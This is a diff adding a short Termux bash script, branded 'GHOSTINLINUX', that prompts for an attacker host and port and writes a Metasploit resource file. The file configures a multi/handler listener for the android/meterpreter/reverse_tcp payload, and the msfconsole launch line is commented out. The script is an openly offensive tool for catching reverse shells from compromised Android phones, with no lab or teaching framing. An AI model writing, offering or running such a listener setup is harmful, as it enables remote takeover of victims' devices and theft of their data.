@@ -1,0 +1,19 @@
+#!/data/data/com.termux/files/usr/bin/bash
+pkg install figlet -y
+clear
+sleep 1
+figlet -f bubble GHOSTINLINUX
+echo ""
+echo ""
+echo ""
+rm -rf ghost.rc
+tput setaf 1; read -p "SET LHOST : " lhost
+echo ""
+echo ""
+tput setaf 1; read -p "SET LPORT : " lport
+echo "use exploit/multi/handler" > ghost.rc
+echo "set payload android/meterpreter/reverse_tcp" >> ghost.rc
+echo "set lhost $lhost" >> ghost.rc
+echo "set lport $lport" >> ghost.rc
+echo "exploit" >> ghost.rc
+#msfconsole -r ghost.rc
